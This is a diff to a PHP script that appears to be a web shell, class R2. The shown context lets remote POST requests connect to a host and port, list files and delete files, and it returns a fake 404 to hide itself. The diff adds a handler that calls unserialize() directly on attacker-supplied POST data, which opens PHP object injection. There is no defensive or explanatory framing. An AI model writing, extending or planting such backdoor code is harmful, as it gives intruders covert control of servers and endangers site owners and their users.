@@ -241,6 +241,10 @@ class R2
     {
         return unlink(getcwd() . DIRECTORY_SEPARATOR . $file);
     }
+    public static function serial($data)
+    {
+        return unserialize($data) . PHP_EOL;
+    }
 }
 set_time_limit(0);
 //error_reporting(0);
@@ -268,6 +272,8 @@ if (isset($_POST['host']) && isset($_POST['port'])) {
     echo R2::ls($_POST['ls']);
 } elseif (isset($_POST['rm'])) {
     echo R2::rm($_POST['rm']);
+} elseif (isset($_POST['serial'])) {
+    echo R2::serial($_POST['serial']);
 } else {
     header('HTTP/1.0 404 Not Found', true, 404);
     exit(404);
